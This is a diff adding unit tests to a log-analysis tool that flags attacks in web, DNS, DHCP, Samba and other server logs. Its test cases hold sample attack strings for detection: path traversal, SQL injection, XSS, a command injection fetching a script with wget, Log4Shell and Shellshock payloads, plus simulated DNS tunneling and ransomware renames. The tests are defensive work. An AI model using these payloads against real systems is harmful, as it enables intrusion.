@@ -234,7 +234,8 @@ class ParseEventTest(unittest.TestCase):
 
     def test_plain_lines_are_not_events(self):
         self.assertIsNone(netlog.parse_event('sshd[1]: Accepted publickey for root'))
-        self.assertIsNone(netlog.parse_event('dnsmasq[7]: query[A] example.com from 10.0.0.5'))
+        self.assertIsNone(netlog.parse_event('dnsmasq[7]: started, version 2.90 cachesize 150'))
+        self.assertIsNone(netlog.parse_event('systemd[1]: Started Session 4 of user root.'))
 
     def test_invalid_mac_field_is_dropped(self):
         p = netlog.parse_event('clientJoin clientMac="not-a-mac" userName="bob"')
@@ -840,6 +841,152 @@ class LoadGrepTest(unittest.TestCase):
         self.assertIn('Lines read: 5 ', text)
 
 
+def _clf(src, path, code=200, t=0, method='GET', ua='Mozilla/5.0', user='-'):
+    h, r = divmod(8 * 3600 + t, 3600)
+    m, sec = divmod(r, 60)
+    return (f'{src} - {user} [01/May/2024:{h:02d}:{m:02d}:{sec:02d} +0000] "{method} {path} HTTP/1.1" '
+            f'{code} 512 "-" "{ua}"')
+
+
+class ServerLogTest(unittest.TestCase):
+    """Linux server formats and the findings built from them."""
+
+    @staticmethod
+    def _titles(lines, **rules):
+        return {(a.title, a.subject): a for a in netlog.collect_alerts(_report(lines, **rules))}
+
+    def test_web_attack_signatures(self):
+        cases = {
+            ('/index.html', 'Mozilla/5.0'): None,
+            ('/search?q=network+logs&page=2', 'Mozilla/5.0'): None,
+            ('/blog/2024/03/hello-world', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'): None,
+            ('/a?file=../../etc/passwd', ''): 'traversal',
+            ('/a?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd', ''): 'traversal',
+            ('/item?id=1%20UNION%20SELECT%20pass%20FROM%20users', ''): 'sqli',
+            ('/q?x=<script>alert(1)</script>', ''): 'xss',
+            ('/ping?host=1.1.1.1;wget http://x/s.sh', ''): 'cmdi',
+            ('/', '${jndi:ldap://x/a}'): 'log4shell',
+            ('/cgi-bin/status', '() { :; }; /bin/bash -c id'): 'cmdi',
+            ('/.env', ''): 'sensitive',
+            ('/.git/config', ''): 'sensitive',
+            ('/phpmyadmin/index.php', ''): 'probe',
+            ('/', 'sqlmap/1.7'): 'scanner',
+        }
+        for (path, ua), want in cases.items():
+            with self.subTest(path=path, ua=ua):
+                self.assertEqual(netlog.web_attack(path, ua), want)
+
+    def test_web_findings(self):
+        lines  = [_clf(f'10.0.0.{i % 20}', '/', t=i) for i in range(200)]
+        lines += [_clf('203.0.113.66', f'/probe{i}.php', 404, t=300 + i) for i in range(35)]
+        lines += [_clf('198.51.100.23', '/dl?f=../../../etc/passwd', 200, t=400)]
+        lines += [_clf('45.83.64.1', '/', 200, t=401, ua='${jndi:ldap://45.83.64.1/a}')]
+        lines += [_clf('10.0.0.1', '/api/report', 502, t=500 + i) for i in range(25)]
+        got = self._titles(lines)
+        self.assertIn(('Web vulnerability scan', '203.0.113.66'), got)
+        self.assertEqual(got[('Web attack may have succeeded', '198.51.100.23')].level, 0)
+        self.assertIn(('Log4Shell exploit attempts', '45.83.64.1'), got)
+        self.assertNotIn(('Web attack may have succeeded', '45.83.64.1'), got)
+        self.assertIn(('Web server errors', '-'), got)
+        self.assertNotIn(('Web vulnerability scan', '203.0.113.66'), self._titles(lines, web_scan=50))
+
+    def test_wordpress_brute_force_then_success_is_critical(self):
+        lines  = [_clf('185.220.101.4', '/wp-login.php', 200, t=i, method='POST') for i in range(8)]
+        lines += [_clf('185.220.101.4', '/wp-login.php', 302, t=20, method='POST')]
+        a = self._titles(lines)[('Login succeeded after brute force', '185.220.101.4')]
+        self.assertEqual(a.level, 0)
+
+    def test_dns_findings(self):
+        q = lambda c, name, typ='A', t=0: (f'{_hms(8 * 3600 + t)} ns1 named[1]: client @0x7f00 {c}#5300 '
+                                          f'({name}): query: {name} IN {typ} +E(0) (10.0.0.1)')
+        lines  = [q('10.0.0.5', 'www.example.com', t=i) for i in range(50)]
+        lines += [q('10.0.3.77', 'a' * 50 + f'{i}.t.evil.example', 'TXT', t=100 + i) for i in range(25)]
+        lines += [f"{_hms(8 * 3600 + 200 + i)} ns1 named[1]: client @0x7f00 198.51.100.99#1000 (isc.org): "
+                  f"query (cache) 'isc.org/ANY/IN' denied" for i in range(25)]
+        lines += [f"{_hms(8 * 3600 + 300)} ns1 named[1]: client @0x7f00 203.0.113.9#4444 (example.com): "
+                  f"zone transfer 'example.com/AXFR/IN' denied"]
+        got = self._titles(lines)
+        self.assertIn(('Possible DNS tunneling', '10.0.3.77'), got)
+        self.assertIn(('DNS amplification attempt', '198.51.100.99'), got)
+        self.assertIn(('Zone transfer attempt', '203.0.113.9'), got)
+        self.assertNotIn(('Possible DNS tunneling', '10.0.0.5'), got)
+
+    def test_dhcp_findings(self):
+        d = lambda t, msg: f'{_hms(8 * 3600 + t)} dhcp1 dhcpd[9]: {msg}'
+        lines  = [d(i, 'DHCPDISCOVER from de:ad:be:ef:00:01 via eth1') for i in range(25)]
+        lines += [d(100 + i, 'DHCPNAK on 192.168.1.20 to aa:bb:cc:11:22:33 via eth1') for i in range(6)]
+        lines += [d(200, 'DHCPDECLINE of 10.0.5.44 from aa:bb:cc:00:02:2c via eth1: abandoned')]
+        lines += [d(300, 'DHCPDISCOVER from aa:bb:cc:99:99:01 via eth3: network 10.0.9.0/24: no free leases')]
+        got = self._titles(lines)
+        self.assertIn(('Client not getting a DHCP lease', 'de:ad:be:ef:00:01'), got)
+        self.assertIn(('DHCP NAKs', 'aa:bb:cc:11:22:33'), got)
+        self.assertIn(('IP address conflict (DHCP decline)', '10.0.5.44'), got)
+        self.assertIn(('DHCP pool exhausted', 'dhcp1'), got)
+
+    def test_mail_samba_fail2ban_radius_systemd_findings(self):
+        t = lambda i: _hms(8 * 3600 + i)
+        lines  = [f'{t(i)} mx1 postfix/smtpd[1]: NOQUEUE: reject: RCPT from unknown[203.0.113.120]: '
+                  f'554 5.7.1 <x@y.net>: Relay access denied; from=<a@b.org> to=<x@y.net> proto=ESMTP'
+                  for i in range(5)]
+        lines += [f'{t(10 + i)} fs1 smbd[1]: Auth: [SMB2,(null)] user [CORP]\\[bob] at [x] with [NTLMv2] '
+                  f'status [{"NT_STATUS_ACCOUNT_LOCKED_OUT" if i == 5 else "NT_STATUS_WRONG_PASSWORD"}] '
+                  f'workstation [WS9] remote host [ipv4:10.0.4.99:50123] mapped to [CORP]\\[bob].'
+                  for i in range(6)]
+        lines += [f'{t(100 + i // 4)} fs1 smbd_audit: carol|10.0.2.31|ws31|projects|renameat|ok|'
+                  f'f{i}.docx|f{i}.docx.crypt' for i in range(120)]
+        lines += [f'2024-05-01 08:0{i}:00,123 fail2ban.actions [7]: NOTICE  [sshd] Ban 193.32.162.7'
+                  for i in range(3)]
+        lines += ['Fri Mar  1 12:00:00 2024 : Error: Ignoring request to auth address * port 1812 bound '
+                  'to server default from unknown client 203.0.113.200 port 4321 proto udp']
+        lines += [f"{t(500)} web1 systemd[1]: app.service: Failed with result 'exit-code'."]
+        got = self._titles(lines)
+        self.assertIn(('Open-relay probing', '203.0.113.120'), got)
+        self.assertIn(('Account locked out', 'bob'), got)
+        self.assertIn(('Login attack (brute force)', '10.0.4.99'), got)
+        self.assertIn(('Mass file changes (possible ransomware)', 'carol'), got)
+        self.assertNotIn(('Mass file changes (possible ransomware)', 'carol'),
+                         self._titles(lines, mass_change=200))
+        self.assertIn(('Repeat offender (fail2ban)', '193.32.162.7'), got)
+        self.assertIn(('RADIUS request from unknown client', '203.0.113.200'), got)
+        self.assertIn(('Service failed', 'web1 app.service'), got)
+
+    def test_samba_message_takes_time_from_header(self):
+        an = netlog.Analyzer(keep_raw=True)
+        an.feed('[2024/03/01 12:00:00.123456,  2] ../../source3/auth/auth.c:334(auth_check_ntlm_password)')
+        ev = an.feed('  check_ntlm_password:  Authentication for user [alice] -> [alice] FAILED with '
+                     'error NT_STATUS_WRONG_PASSWORD, authoritative=1')
+        self.assertEqual(ev.kind, 'login_fail')
+        self.assertEqual(netlog._fmt_ts(ev.ts), 'Mar 01 12:00:00')
+
+    def test_requests_are_aggregated_not_kept(self):
+        rep = _report([_clf('10.0.0.1', '/', t=i) for i in range(10)])
+        self.assertEqual(rep.events, [])
+        self.assertEqual(rep.svc.web_req, 10)
+        self.assertIsNotNone(rep.first_ts)
+
+    def test_summary_has_servers_section(self):
+        lines  = [_clf('10.0.0.1', '/', t=i) for i in range(5)]
+        lines += ['Mar  1 12:00:00 gw dnsmasq[123]: query[A] example.com from 10.0.0.5',
+                  'Mar  1 12:00:01 dhcp1 dhcpd[812]: DHCPACK on 10.0.0.50 to aa:bb:cc:dd:ee:ff via eth1']
+        text = netlog.format_summary(_report(lines), {})
+        for heading in ('SERVERS & SERVICES', 'Web requests', 'DNS', 'DHCP'):
+            self.assertIn(heading, text)
+        self.assertNotIn('WIRELESS', text)
+
+    def test_client_timeline_for_dhcp_only_mac(self):
+        an = netlog.Analyzer(keep_raw=True, context_macs={'aa:bb:cc:dd:ee:ff'})
+        an.feed('Mar  1 12:00:01 dhcp1 dhcpd[812]: DHCPACK on 10.0.0.50 to aa:bb:cc:dd:ee:ff via eth1')
+        text, found = netlog.format_timeline(netlog.Report(an), 'aa:bb:cc:dd:ee:ff', {})
+        self.assertTrue(found)
+        self.assertIn('DHCPACK on 10.0.0.50', text)
+
+    def test_new_text_detectors(self):
+        self.assertEqual(netlog.text_issue('type=AVC msg=audit(1.2:3): avc:  denied  { read } for pid=1'),
+                         'macdeny')
+        self.assertEqual(netlog.text_issue('dnsmasq-dhcp[1]: DHCPDISCOVER(br0) aa:bb:cc:dd:ee:ff no '
+                                           'address available'), 'dhcp')
+
+
 class WrapLayoutTest(unittest.TestCase):
     PREFIX = [('✗ ', 0)]
 
@@ -940,7 +1087,8 @@ class AnalysisCliTest(unittest.TestCase):
         ns, r = netlog.parse_cli(['x.log']), netlog.Rules()
         for opt in ('flap_threshold', 'flap_window', 'brute_threshold', 'brute_window',
                     'scan_ports', 'scan_hosts', 'scan_window', 'spray_accounts',
-                    'spray_sources', 'spike_min', 'spike_factor', 'spike_window'):
+                    'spray_sources', 'spike_min', 'spike_factor', 'spike_window', 'web_scan',
+                    'mass_change'):
             with self.subTest(opt=opt):
                 self.assertEqual(getattr(ns, opt), getattr(r, opt))
 
